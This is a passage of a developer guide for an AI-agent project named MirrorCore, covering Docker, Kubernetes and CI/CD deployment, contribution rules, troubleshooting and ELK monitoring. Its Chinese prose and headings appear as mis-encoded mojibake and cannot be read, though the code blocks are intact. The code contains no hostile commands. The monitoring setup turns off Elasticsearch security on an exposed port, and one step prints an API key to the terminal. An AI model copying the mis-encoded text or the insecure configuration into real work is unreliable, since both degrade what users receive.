# è¿è¡Œæµ‹è¯•
npm run test

# å¯åŠ¨å¼€å‘æœåŠ¡å™¨
npm run dev
```

### ç”Ÿäº§ç¯å¢ƒéƒ¨ç½²

#### Docker éƒ¨ç½²

```dockerfile
# Dockerfile
FROM node:18-alpine AS builder

WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production

COPY . .
RUN npm run build

FROM node:18-alpine AS runtime

WORKDIR /app
COPY --from=builder /app/dist ./dist
COPY --from=builder /app/node_modules ./node_modules
COPY --from=builder /app/package.json ./

EXPOSE 3000
CMD ["node", "dist/index.js"]
```

```yaml
# docker-compose.prod.yml
version: '3.8'

services:
  app:
    build: .
    ports:
      - "3000:3000"
    environment:
      - NODE_ENV=production
      - STORAGE_TYPE=file
      - STORAGE_PATH=/app/data
    volumes:
      - app_data:/app/data
    restart: unless-stopped

volumes:
  app_data:
```

#### Kubernetes éƒ¨ç½²

```yaml
# k8s/deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: mirrorcore-app
spec:
  replicas: 3
  selector:
    matchLabels:
      app: mirrorcore-app
  template:
    metadata:
      labels:
        app: mirrorcore-app
    spec:
      containers:
      - name: app
        image: mirrorcore:latest
        ports:
        - containerPort: 3000
        env:
        - name: NODE_ENV
          value: "production"
        - name: STORAGE_TYPE
          value: "file"
        - name: STORAGE_PATH
          value: "/app/data"
        resources:
          requests:
            memory: "512Mi"
            cpu: "250m"
          limits:
            memory: "1Gi"
            cpu: "500m"
        livenessProbe:
          httpGet:
            path: /health
            port: 3000
          initialDelaySeconds: 30
          periodSeconds: 10
        readinessProbe:
          httpGet:
            path: /ready
            port: 3000
          initialDelaySeconds: 5
          periodSeconds: 5
```

### CI/CD æµæ°´çº¿

```yaml
# .github/workflows/ci-cd.yml
name: CI/CD Pipeline

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'
          cache: 'npm'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Run linting
        run: npm run lint
      
      - name: Run tests
        run: npm run test:coverage
      
      - name: Upload coverage
        uses: codecov/codecov-action@v3

  build:
    needs: test
    runs-on: ubuntu-latest
    if: github.ref == 'refs/heads/main'
    steps:
      - uses: actions/checkout@v3
      
      - name: Build Docker image
        run: docker build -t mirrorcore:${{ github.sha }} .
      
      - name: Push to registry
        run: |
          echo ${{ secrets.DOCKER_PASSWORD }} | docker login -u ${{ secrets.DOCKER_USERNAME }} --password-stdin
          docker push mirrorcore:${{ github.sha }}

  deploy:
    needs: build
    runs-on: ubuntu-latest
    if: github.ref == 'refs/heads/main'
    steps:
      - name: Deploy to production
        run: |
          # éƒ¨ç½²è„šæœ¬
          kubectl set image deployment/mirrorcore-app app=mirrorcore:${{ github.sha }}
```

---

## ğŸ¤ è´¡çŒ®æŒ‡å—

### è´¡çŒ®æµç¨‹

1. **Fork é¡¹ç›®**
   ```bash
   # Fork é¡¹ç›®åˆ°ä½ çš„ GitHub è´¦æˆ·
   # å…‹éš†ä½ çš„ fork
   git clone https://github.com/your-username/mirrorcore.git
   cd mirrorcore
   
   # æ·»åŠ ä¸Šæ¸¸ä»“åº“
   git remote add upstream https://github.com/original-org/mirrorcore.git
   ```

2. **åˆ›å»ºåŠŸèƒ½åˆ†æ”¯**
   ```bash
   # ä» develop åˆ†æ”¯åˆ›å»ºæ–°åˆ†æ”¯
   git checkout develop
   git pull upstream develop
   git checkout -b feature/your-feature-name
   ```

3. **å¼€å‘å’Œæµ‹è¯•**
   ```bash
   # è¿›è¡Œå¼€å‘
   # è¿è¡Œæµ‹è¯•
   npm run test
   
   # è¿è¡Œä»£ç æ£€æŸ¥
   npm run lint
   
   # æäº¤æ›´æ”¹
   git add .
   git commit -m "feat: add new feature description"
   ```

4. **æäº¤ Pull Request**
   ```bash
   # æ¨é€åˆ†æ”¯
   git push origin feature/your-feature-name
   
   # åœ¨ GitHub ä¸Šåˆ›å»º Pull Request
   ```

### æäº¤ä¿¡æ¯è§„èŒƒ

ä½¿ç”¨ [Conventional Commits](https://www.conventionalcommits.org/) è§„èŒƒï¼š

```
<type>[optional scope]: <description>

[optional body]

[optional footer(s)]
```

**ç±»å‹è¯´æ˜**:
- `feat`: æ–°åŠŸèƒ½
- `fix`: é”™è¯¯ä¿®å¤
- `docs`: æ–‡æ¡£æ›´æ–°
- `style`: ä»£ç æ ¼å¼åŒ–
- `refactor`: ä»£ç é‡æ„
- `test`: æµ‹è¯•ç›¸å…³
- `chore`: æ„å»ºè¿‡ç¨‹æˆ–è¾…åŠ©å·¥å…·çš„å˜åŠ¨

**ç¤ºä¾‹**:
```
feat(code-analysis): add TypeScript support for code generation

- Add TypeScript AST parsing
- Implement type-aware code generation
- Add comprehensive test coverage

Closes #123
```

### ä»£ç å®¡æŸ¥æ¸…å•

#### åŠŸèƒ½æ€§
- [ ] åŠŸèƒ½æ˜¯å¦æŒ‰é¢„æœŸå·¥ä½œ
- [ ] æ˜¯å¦æœ‰é€‚å½“çš„é”™è¯¯å¤„ç†
- [ ] æ˜¯å¦æœ‰è¶³å¤Ÿçš„æµ‹è¯•è¦†ç›–
- [ ] æ˜¯å¦è€ƒè™‘äº†è¾¹ç•Œæƒ…å†µ

#### ä»£ç è´¨é‡
- [ ] ä»£ç æ˜¯å¦éµå¾ªé¡¹ç›®è§„èŒƒ
- [ ] æ˜¯å¦æœ‰é€‚å½“çš„æ³¨é‡Šå’Œæ–‡æ¡£
- [ ] æ˜¯å¦æœ‰ä»£ç é‡å¤
- [ ] æ˜¯å¦ä½¿ç”¨äº†åˆé€‚çš„è®¾è®¡æ¨¡å¼

#### æ€§èƒ½
- [ ] æ˜¯å¦æœ‰æ€§èƒ½é—®é¢˜
- [ ] æ˜¯å¦æœ‰å†…å­˜æ³„æ¼é£é™©
- [ ] æ˜¯å¦æœ‰ä¸å¿…è¦çš„è®¡ç®—

#### å®‰å…¨æ€§
- [ ] æ˜¯å¦æœ‰å®‰å…¨æ¼æ´
- [ ] è¾“å…¥éªŒè¯æ˜¯å¦å……åˆ†
- [ ] æ˜¯å¦æ­£ç¡®å¤„ç†æ•æ„Ÿæ•°æ®

---

## ğŸ” æ•…éšœæ’é™¤

### å¸¸è§é—®é¢˜

#### 1. ä¾èµ–å®‰è£…å¤±è´¥

**é—®é¢˜**: `npm install` å¤±è´¥
```bash
npm ERR! peer dep missing: typescript@>=4.5.0
```

**è§£å†³æ–¹æ¡ˆ**:
```bash
# æ¸…ç†ç¼“å­˜
npm cache clean --force

# åˆ é™¤ node_modules å’Œ package-lock.json
rm -rf node_modules package-lock.json

# é‡æ–°å®‰è£…
npm install

# å¦‚æœä»ç„¶å¤±è´¥ï¼Œå°è¯•ä½¿ç”¨ yarn
yarn install
```

#### 2. TypeScript ç¼–è¯‘é”™è¯¯

**é—®é¢˜**: ç±»å‹æ£€æŸ¥å¤±è´¥
```
error TS2345: Argument of type 'string' is not assignable to parameter of type 'number'
```

**è§£å†³æ–¹æ¡ˆ**:
```bash
# æ£€æŸ¥ TypeScript é…ç½®
npx tsc --showConfig

# è¿è¡Œç±»å‹æ£€æŸ¥
npx tsc --noEmit

# æ›´æ–°ç±»å‹å®šä¹‰
npm update @types/node
```

#### 3. æ•°æ®åº“è¿æ¥é—®é¢˜

**é—®é¢˜**: æ— æ³•è¿æ¥åˆ°æ•°æ®åº“
```
Error: connect ECONNREFUSED 127.0.0.1:5432
```

**è§£å†³æ–¹æ¡ˆ**:
```bash
# æ£€æŸ¥å­˜å‚¨æœåŠ¡çŠ¶æ€
ls -la ./data/

# æ£€æŸ¥å­˜å‚¨é…ç½®
echo $STORAGE_TYPE
echo $STORAGE_PATH
```

#### 4. AI æœåŠ¡è°ƒç”¨å¤±è´¥

**é—®é¢˜**: OpenAI API è°ƒç”¨å¤±è´¥
```
Error: Request failed with status code 401
```

**è§£å†³æ–¹æ¡ˆ**:
```bash
# æ£€æŸ¥ API å¯†é’¥
echo $OPENAI_API_KEY

# éªŒè¯ API å¯†é’¥æœ‰æ•ˆæ€§
curl -H "Authorization: Bearer $OPENAI_API_KEY" \
     https://api.openai.com/v1/models

# æ£€æŸ¥é…é¢å’Œé™åˆ¶
```

### è°ƒè¯•æŠ€å·§

#### 1. å¯ç”¨è¯¦ç»†æ—¥å¿—

```typescript
// åœ¨å¼€å‘ç¯å¢ƒä¸­å¯ç”¨è°ƒè¯•æ—¥å¿—
process.env.LOG_LEVEL = 'debug';

// ä½¿ç”¨ç»“æ„åŒ–æ—¥å¿—
logger.debug('Processing request', {
  userId: req.user.id,
  action: 'code_analysis',
  projectPath: req.body.projectPath
});
```

#### 2. ä½¿ç”¨è°ƒè¯•å™¨

```bash
# å¯åŠ¨è°ƒè¯•æ¨¡å¼
npm run dev:debug

# æˆ–è€…ä½¿ç”¨ VS Code è°ƒè¯•é…ç½®
```

```json
// .vscode/launch.json
{
  "version": "0.2.0",
  "configurations": [
    {
      "name": "Debug Backend",
      "type": "node",
      "request": "launch",
      "program": "${workspaceFolder}/src/index.ts",
      "outFiles": ["${workspaceFolder}/dist/**/*.js"],
      "runtimeArgs": ["-r", "ts-node/register"],
      "env": {
        "NODE_ENV": "development"
      }
    }
  ]
}
```

#### 3. æ€§èƒ½åˆ†æ

```bash
# ä½¿ç”¨ clinic.js è¿›è¡Œæ€§èƒ½åˆ†æ
npm install -g clinic
clinic doctor -- node dist/index.js

# ä½¿ç”¨ 0x è¿›è¡Œç«ç„°å›¾åˆ†æ
npm install -g 0x
0x -- node dist/index.js
```

### ç›‘æ§å’Œå‘Šè­¦

#### å¥åº·æ£€æŸ¥ç«¯ç‚¹

```typescript
// src/routes/health.ts
app.get('/health', async (req, res) => {
  const health = {
    status: 'ok',
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    memory: process.memoryUsage(),
    services: {
      storage: await checkStorageHealth(),
      aiService: await checkAIServiceHealth()
    }
  };
  
  const isHealthy = Object.values(health.services).every(service => service.status === 'ok');
  
  res.status(isHealthy ? 200 : 503).json(health);
});
```

#### æ—¥å¿—èšåˆ

```yaml
# docker-compose.monitoring.yml
version: '3.8'

services:
  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:8.5.0
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=false
    ports:
      - "9200:9200"

  logstash:
    image: docker.elastic.co/logstash/logstash:8.5.0
    volumes:
      - ./logstash.conf:/usr/share/logstash/pipeline/logstash.conf
    depends_on:
      - elasticsearch

  kibana:
    image: docker.elastic.co/kibana/kibana:8.5.0
    ports:
      - "5601:5601"
    depends_on:
      - elasticsearch
```

---

## ğŸ“š å‚è€ƒèµ„æº

### å®˜æ–¹æ–‡æ¡£
- [Node.js å®˜æ–¹æ–‡æ¡£](https://nodejs.org/docs/)
- [TypeScript å®˜æ–¹æ–‡æ¡£](https://www.typescriptlang.org/docs/)
- [React å®˜æ–¹æ–‡æ¡£](https://react.dev/)
- [Electron å®˜æ–¹æ–‡æ¡£](https://www.electronjs.org/docs/)

### æœ€ä½³å®è·µ
- [Node.js æœ€ä½³å®è·µ](https://github.com/goldbergyoni/nodebestpractices)
- [TypeScript æœ€ä½³å®è·µ](https://typescript-eslint.io/rules/)
- [React æœ€ä½³å®è·µ](https://react.dev/learn/thinking-in-react)

### å·¥å…·å’Œåº“
- [Jest æµ‹è¯•æ¡†æ¶](https://jestjs.io/docs/getting-started)
- [Playwright E2E æµ‹è¯•](https://playwright.dev/docs/intro)
- [ESLint ä»£ç æ£€æŸ¥](https://eslint.org/docs/user-guide/)
- [Prettier ä»£ç æ ¼å¼åŒ–](https://prettier.io/docs/en/index.html)

---

<div align="center">

**ğŸ› ï¸ MirrorCore AIæ™ºèƒ½ä½“ç³»ç»Ÿå¼€å‘æŒ‡å—**

Made with â¤ï¸ by MirrorCore AI Agent Development Team

</div>